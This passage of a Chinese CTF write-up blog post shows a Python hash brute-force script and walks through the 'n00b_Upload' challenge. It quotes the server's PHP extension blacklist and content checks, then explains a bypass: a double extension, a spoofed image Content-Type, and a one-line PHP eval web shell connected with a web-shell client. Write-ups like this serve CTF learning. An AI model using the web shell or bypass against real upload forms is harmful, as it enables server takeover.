</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>min_value</span><span class=p>,</span> <span class=n>max_value</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>min_value</span><span class=p>,</span> <span class=n>max_value</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>d</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>min_value</span><span class=p>,</span> <span class=n>max_value</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>plaintext</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>charset</span><span class=p>[</span><span class=n>a</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span><span class=si>}{</span><span class=n>charset</span><span class=p>[</span><span class=n>b</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span><span class=si>}{</span><span class=n>charset</span><span class=p>[</span><span class=n>c</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span><span class=si>}{</span><span class=n>charset</span><span class=p>[</span><span class=n>d</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span><span class=si>}{</span><span class=n>known_plaintext</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=n>hash_value</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>plaintext</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>plaintext</span><span class=o>+</span><span class=s2>&#34;还在碰撞中&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>hash_value</span> <span class=o>==</span> <span class=n>known_hash</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=k>return</span> <span class=n>plaintext</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>known_plaintext</span> <span class=o>=</span> <span class=s2>&#34;E2g37ZVS00iwlIrO&#34;</span>
</span></span><span class=line><span class=cl><span class=n>known_hash</span> <span class=o>=</span> <span class=s2>&#34;cd0f34c6a816a54075851cf66c864dafd0fbb0d8119cc2084b54a006d561c308&#34;</span>
</span></span><span class=line><span class=cl><span class=n>charset</span> <span class=o>=</span> <span class=s2>&#34;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
</span></span><span class=line><span class=cl><span class=n>min_value</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>max_value</span> <span class=o>=</span> <span class=mi>62</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>collision</span> <span class=o>=</span> <span class=n>find_collision</span><span class=p>(</span><span class=n>known_plaintext</span><span class=p>,</span> <span class=n>known_hash</span><span class=p>,</span> <span class=n>charset</span><span class=p>,</span><span class=n>min_value</span><span class=p>,</span> <span class=n>max_value</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>collision</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;找到了一个碰撞：</span><span class=si>{</span><span class=n>collision</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;没有找到碰撞&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h2 id=四n00b_upload>四、n00b_Upload
<a class=header-anchor href=#%e5%9b%9bn00b_upload></a></h2><p>后缀判定</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-12-1><a class=lnlinks href=#hl-12-1>1</a>
</span><span class=lnt id=hl-12-2><a class=lnlinks href=#hl-12-2>2</a>
</span><span class=lnt id=hl-12-3><a class=lnlinks href=#hl-12-3>3</a>
</span><span class=lnt id=hl-12-4><a class=lnlinks href=#hl-12-4>4</a>
</span><span class=lnt id=hl-12-5><a class=lnlinks href=#hl-12-5>5</a>
</span><span class=lnt id=hl-12-6><a class=lnlinks href=#hl-12-6>6</a>
</span><span class=lnt id=hl-12-7><a class=lnlinks href=#hl-12-7>7</a>
</span><span class=lnt id=hl-12-8><a class=lnlinks href=#hl-12-8>8</a>
</span><span class=lnt id=hl-12-9><a class=lnlinks href=#hl-12-9>9</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$ext_arr</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;jpg&#39;</span><span class=p>,</span><span class=s1>&#39;png&#39;</span><span class=p>,</span><span class=s1>&#39;gif&#39;</span><span class=p>,</span><span class=s1>&#39;php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl> <span class=c1>//黑名单
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=nv>$deny_ext</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;php&#34;</span><span class=p>,</span><span class=s2>&#34;php5&#34;</span><span class=p>,</span><span class=s2>&#34;php4&#34;</span><span class=p>,</span><span class=s2>&#34;php3&#34;</span><span class=p>,</span><span class=s2>&#34;php2&#34;</span><span class=p>,</span><span class=s2>&#34;html&#34;</span><span class=p>,</span><span class=s2>&#34;htm&#34;</span><span class=p>,</span><span class=s2>&#34;phtml&#34;</span><span class=p>,</span><span class=s2>&#34;pht&#34;</span><span class=p>,</span><span class=s2>&#34;pHp&#34;</span><span class=p>,</span><span class=s2>&#34;pHp5&#34;</span><span class=p>,</span><span class=s2>&#34;pHp4&#34;</span><span class=p>,</span><span class=s2>&#34;pHp3&#34;</span><span class=p>,</span><span class=s2>&#34;pHp2&#34;</span><span class=p>,</span><span class=s2>&#34;Html&#34;</span><span class=p>,</span><span class=s2>&#34;Htm&#34;</span><span class=p>,</span><span class=s2>&#34;pHtml&#34;</span><span class=p>,</span><span class=s2>&#34;jsp&#34;</span><span class=p>,</span><span class=s2>&#34;jspa&#34;</span><span class=p>,</span><span class=s2>&#34;jspx&#34;</span><span class=p>,</span><span class=s2>&#34;jsw&#34;</span><span class=p>,</span><span class=s2>&#34;jsv&#34;</span><span class=p>,</span><span class=s2>&#34;jspf&#34;</span><span class=p>,</span><span class=s2>&#34;jtml&#34;</span><span class=p>,</span><span class=s2>&#34;jSp&#34;</span><span class=p>,</span><span class=s2>&#34;jSpx&#34;</span><span class=p>,</span><span class=s2>&#34;jSpa&#34;</span><span class=p>,</span><span class=s2>&#34;jSw&#34;</span><span class=p>,</span><span class=s2>&#34;jSv&#34;</span><span class=p>,</span><span class=s2>&#34;jSpf&#34;</span><span class=p>,</span><span class=s2>&#34;jHtml&#34;</span><span class=p>,</span><span class=s2>&#34;asp&#34;</span><span class=p>,</span><span class=s2>&#34;aspx&#34;</span><span class=p>,</span><span class=s2>&#34;asa&#34;</span><span class=p>,</span><span class=s2>&#34;asax&#34;</span><span class=p>,</span><span class=s2>&#34;ascx&#34;</span><span class=p>,</span><span class=s2>&#34;ashx&#34;</span><span class=p>,</span><span class=s2>&#34;asmx&#34;</span><span class=p>,</span><span class=s2>&#34;cer&#34;</span><span class=p>,</span><span class=s2>&#34;aSp&#34;</span><span class=p>,</span><span class=s2>&#34;aSpx&#34;</span><span class=p>,</span><span class=s2>&#34;aSa&#34;</span><span class=p>,</span><span class=s2>&#34;.aSax&#34;</span><span class=p>,</span><span class=s2>&#34;.aScx&#34;</span><span class=p>,</span><span class=s2>&#34;.aShx&#34;</span><span class=p>,</span><span class=s2>&#34;.aSmx&#34;</span><span class=p>,</span><span class=s2>&#34;.cEr&#34;</span><span class=p>,</span><span class=s2>&#34;.sWf&#34;</span><span class=p>,</span><span class=s2>&#34;.swf&#34;</span><span class=p>,</span><span class=s2>&#34;htaccess&#34;</span><span class=p>,</span><span class=s2>&#34;ini&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl> <span class=nv>$file_ext</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>],</span><span class=nx>strrpos</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>],</span><span class=s2>&#34;.&#34;</span><span class=p>)</span><span class=o>+</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl> <span class=c1>//判断filename是否为空
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=nv>$file</span> <span class=o>=</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl> <span class=c1>//判断filename的后缀是不是在黑名单
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=nv>$name</span> <span class=o>=</span> <span class=nx>basename</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl> <span class=nv>$filename_ext</span><span class=o>=</span> <span class=nx>pathinfo</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span><span class=nx>PATHINFO_EXTENSION</span><span class=p>);</span></span></span></code></pre></td></tr></table></div></div><p>请求头头部判定</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-13-1><a class=lnlinks href=#hl-13-1>1</a>
</span><span class=lnt id=hl-13-2><a class=lnlinks href=#hl-13-2>2</a>
</span><span class=lnt id=hl-13-3><a class=lnlinks href=#hl-13-3>3</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>//检验文件头content-type
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>((</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;type&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;image/jpeg&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;type&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;image/png&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;type&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;image/gif&#39;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;头部过了&lt;br&gt;&#34;</span><span class=p>;</span></span></span></code></pre></td></tr></table></div></div><p>文件内容判定</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-14-1><a class=lnlinks href=#hl-14-1> 1</a>
</span><span class=lnt id=hl-14-2><a class=lnlinks href=#hl-14-2> 2</a>
</span><span class=lnt id=hl-14-3><a class=lnlinks href=#hl-14-3> 3</a>
</span><span class=lnt id=hl-14-4><a class=lnlinks href=#hl-14-4> 4</a>
</span><span class=lnt id=hl-14-5><a class=lnlinks href=#hl-14-5> 5</a>
</span><span class=lnt id=hl-14-6><a class=lnlinks href=#hl-14-6> 6</a>
</span><span class=lnt id=hl-14-7><a class=lnlinks href=#hl-14-7> 7</a>
</span><span class=lnt id=hl-14-8><a class=lnlinks href=#hl-14-8> 8</a>
</span><span class=lnt id=hl-14-9><a class=lnlinks href=#hl-14-9> 9</a>
</span><span class=lnt id=hl-14-10><a class=lnlinks href=#hl-14-10>10</a>
</span><span class=lnt id=hl-14-11><a class=lnlinks href=#hl-14-11>11</a>
</span><span class=lnt id=hl-14-12><a class=lnlinks href=#hl-14-12>12</a>
</span><span class=lnt id=hl-14-13><a class=lnlinks href=#hl-14-13>13</a>
</span><span class=lnt id=hl-14-14><a class=lnlinks href=#hl-14-14>14</a>
</span><span class=lnt id=hl-14-15><a class=lnlinks href=#hl-14-15>15</a>
</span><span class=lnt id=hl-14-16><a class=lnlinks href=#hl-14-16>16</a>
</span><span class=lnt id=hl-14-17><a class=lnlinks href=#hl-14-17>17</a>
</span><span class=lnt id=hl-14-18><a class=lnlinks href=#hl-14-18>18</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=c1>//整个文件内容检测
</span></span></span><span class=line><span class=cl><span class=c1></span>       <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$filename</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$filetype</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;type&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$filesize</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;size&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$tmp_name</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=c1># generate a new filename based on a random number and the original file extension
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$new_filename</span> <span class=o>=</span> <span class=nx>rand</span><span class=p>(</span><span class=mi>100000</span><span class=p>,</span> <span class=mi>999999</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;_&#39;</span> <span class=o>.</span> <span class=nx>uniqid</span><span class=p>()</span> <span class=o>.</span> <span class=s1>&#39;.&#39;</span> <span class=o>.</span> <span class=nv>$file_ext</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># move uploaded file to the target directory
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$target_dir</span> <span class=o>=</span> <span class=s1>&#39;uploadtest&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$target_path</span> <span class=o>=</span> <span class=nv>$target_dir</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nv>$new_filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$tmp_name</span><span class=p>,</span> <span class=nv>$target_path</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1># get file contents and check if it contains PHP code
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$file_content</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$target_path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&lt;\?(php)|&lt;script\b[^&gt;]*&gt;(.*?)&lt;\/script&gt;/si&#39;</span><span class=p>,</span> <span class=nv>$file_content</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;你上传的内容一看就是木马&lt;br&gt;https://ys.mihoyo.com/&#39;</span><span class=p>);</span></span></span></code></pre></td></tr></table></div></div><p>综上所述，使用1.php.jpg即可绕过后最检测，使用burp可以改请求头头部为image/jpeg，然后一句话木马为&lt;?=eval($_POST[&ldquo;cmd&rdquo;]);再用菜刀链接即可（不知道为什么蚁剑不行）</p><p>以上php内容都是通过菜刀链接获得upload_file.php得来的</p></div><footer class=post-footer><div class=post-tags><a href=/tags/%E6%AF%94%E8%B5%9B%E7%BB%93%E6%9E%9C/>比赛结果</a></div><div class=post-share-tools><div class=post-share-loading><i class="fa-solid fa-ellipsis fa-spin"></i></div><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class=a2a_dd href=https://www.addtoany.com/share></a><a class=a2a_button_wechat></a><a class=a2a_button_qzone></a><a class=a2a_button_sina_weibo></a><a class=a2a_button_douban></a><a class=a2a_button_facebook></a><a class=a2a_button_x></a><a class=a2a_button_email></a><a class=a2a_button_printfriendly></a></div></div><hr><div class=post-copyright><img src=/imgs/cc/cc.svg class=cc-icon width=75 height=75 align=right alt=共享知识 title=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
GEEK极客部分WriteUp</li><li class=post-copyright-author><strong>本文作者： </strong>LinKer</li><li class=post-copyright-link><strong>本文链接：</strong>
<a id=post-cr-link href=https://blog.000k.de/post/GEEK%E2%80%99sWriteUp.html title=GEEK极客部分WriteUp>https://blog.000k.de/post/GEEK%E2%80%99sWriteUp.html</a></li><li class=post-copyright-license><strong>版权声明： </strong>本作品采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans>BY-NC-SA</a> 许可协议。转载请注明出处！</li><li><div class=license-icons><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans target=_blank><img src=/imgs/cc/big/by_nc_sa.svg alt=BY-NC-SA title=BY-NC-SA>
</a><a href=https://notbyai.fyi target=_blank><img src=/imgs/notbyai/zh-hans/white.svg title="Not By AI"></a></div></li></ul></div><div class=followme><span>欢迎关注我的其它发布渠道</span><div class=social-list><div class=social-item><a target=_blank class=social-link href=/images/wechat_channel.jpg><span class=icon><i class="fab fa-weixin"></i>
</span><span class=label>WeChat</span></a></div><div class=social-item><a target=_blank class=social-link href=/rss.xml><span class=icon><i class="fa fa-rss"></i>
</span><span class=label>RSS</span></a></div></div></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/2023/11/13StudyNeiWang.html rel=next title=内网渗透-通信技术><i class="fa fa-chevron-left"></i> 内网渗透-通信技术</a></div><div class="post-nav-prev post-nav-item"><a href=/post/1112.html rel=prev title=正向代理和反向代理>正向代理和反向代理
<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div id=comments class=post-comments><div class=comment-head><div class=comment-headline><i class="fas fa-comments fa-fw"></i>
<span>评论交流</span></div><div class=comment-switch><span class=first-comment>Giscus</span>
<span class=switch-btn></span>
<span class=second-comment>Waline</span></div></div><div class=comment-wrap><div><div class=comment-loading><i class="fa fa-sync fa-spin"></i></div><div class=giscus-container></div></div><div><div class=comment-loading><i class="fa fa-sync fa-spin"></i></div><div class=waline-container></div></div></div></div></div></main><footer class=footer><div class=footer-inner><div id=i18n-translate class=i18n-translate><i class="fa fa-language"></i><div id=lang-select class=lang-select><div id=lang-selected class=selected-option><span class="flag-icon flag-icon-zh-cn"></span>
<span class=selected-language>简体中文</span>
<i class="fa fa-chevron-down"></i></div><div id=lang-options class=lang-options><div class=lang-option lang-code=zh-cn lang-name=简体中文 lang-url=/post/GEEK%E2%80%99sWriteUp.html><span class="flag-icon flag-icon-zh-cn"></span>
<span class=lang-name>简体中文</span></div></div></div></div><div class=copyright>&copy;
<span itemprop=copyrightYear>2023 - 2025
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>LinKer</span></div><div class=beian><p id=hitokoto>获取中...</p><script src="https://v1.hitokoto.cn/?encode=js&select=%23hitokoto" defer></script></div></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":true,"expired":false,"isHome":false,"isPage":true,"path":"GEEK%E2%80%99sWriteUp.html","permalink":"https://blog.000k.de/post/GEEK%E2%80%99sWriteUp.html","title":"GEEK极客部分WriteUp","toc":true}</script><script type=text/javascript src=https://blog.000k.de/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://blog.000k.de/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":true,"giscus":{"cfg":{"category":"General","categoryid":"DIC_kwDOJ9_vEs4CejNU","emit":true,"inputposition":"top","mapping":"pathname","reactions":false,"repo":"0linkun/0linkun.github.io","repoid":"R_kgDOJ9_vEg","theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://blog.000k.de/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":true,"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"zoomInUp","postblock":"zoomInUp","postbody":"bounceInDown","postheader":"rotateIn","sidebar":"flip"}},"postmeta":{"comments":{"enable":false,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":true},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"twikoo":{"cfg":{"envid":"http://192.168.31.50:8080","region":"ap-guangzhou"},"js":{"file":"dist/twikoo.all.min.js","name":"twikoo","version":"1.6.41"}},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://blog.000k.de/js/3rd"}},"version":"4.7.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src="/js/main.min.js?=1748343637" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1748343637" defer></script></body></html>